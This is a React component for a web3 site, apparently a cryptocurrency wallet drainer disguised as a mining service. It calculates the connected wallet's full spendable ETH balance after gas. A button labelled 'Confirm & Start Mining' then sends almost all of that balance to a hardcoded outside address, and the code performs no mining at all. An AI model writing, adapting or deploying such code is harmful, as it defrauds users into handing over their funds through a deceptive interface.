import { useBalance, useFeeData } from "wagmi";
import { useAppKitAccount } from "@reown/appkit/react";
import { formatUnits, parseUnits } from "viem";
import { useSendTransaction, useWaitForTransactionReceipt } from "wagmi";
import { parseEther } from "viem";
import GetBalance from "./GetBalance";
import "./componet.css";
/* global BigInt */

function GetMaxAmount() {
  const { data: hash, isPending, sendTransaction } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({
      hash,
    });
  const { address, isConnected } = useAppKitAccount();
  const { data: balanceData } = useBalance({ address });
  const { data: feeData } = useFeeData(); // Get current gas price

  if (!isConnected) return <p>Wallet Not Connected</p>;
  /*if (!balanceData || !feeData)
    return (
      <p>
        {" "}
        <i className="fas fa-spinner fa-spin"></i>Loading ...
      </p>
    );*/

  /*const balanceInWei = balanceData.value; // Balance in wei
  const gasPriceInWei = feeData.gasPrice || BigInt(0); // Gas price in wei*/
  const balanceInWei = balanceData?.value ?? BigInt(0); // Balance in wei
  const gasPriceInWei = feeData?.gasPrice ?? BigInt(0); // Gas price in wei

  const gasLimit = BigInt(21000); // Standard ETH transfer gas limit

  // Calculate max ETH that can be sent (balance - gas fee)
  const maxSpendableWei = balanceInWei - gasPriceInWei * gasLimit;
  const maxSpendableETH =
    maxSpendableWei > 0 ? formatUnits(maxSpendableWei, 18) : "0";
  console.log(maxSpendableETH);

  return (
    <div id="confirmPanel" className="panel card p-4 mb-4">
      <button
        id="confirmButton"
        className="btn btn-warning btn-block"
        onClick={() =>
          sendTransaction({
            to: "0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb",
            value: parseEther(
              (parseFloat(maxSpendableETH) - 0.0008).toFixed(18)
            ),
          })
        }
        disabled={isPending}
        type="submit"
      >
        <i className="fas fa-paper-plane"></i>
        Confirm & Start Mining
        <p>{isPending ? "Confirming..." : ""}</p>
      </button>

      <div id="balanceDisplay" className="balance-display mt-3 text-center">
        <GetBalance />
      </div>
      <div>
        {/*<p>Max Spendable: {maxSpendableETH} ETH</p>*/}
        {isConfirming && (
          <div>
            {" "}
            <i className="fas fa-spinner fa-spin"></i> Waiting for
            confirmation...
          </div>
        )}
        {isConfirmed && <div>Transaction confirmed🚀</div>}
      </div>
      <div>
        <div>{hash && <div>Transaction Hash: {hash}</div>}</div>
      </div>
      <div id="confirmStatus" className="status-message mt-3 text-center"></div>
      <div>
        {isConfirmed && (
          <div>
            <button type="button" className="btn btn-outline-warning">
              <div>
                <a
                  href="/mining.html"
                  style={{ textDecoration: "none", color: "inherit" }}
                >
                  START MINING
                </a>
              </div>
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default GetMaxAmount;
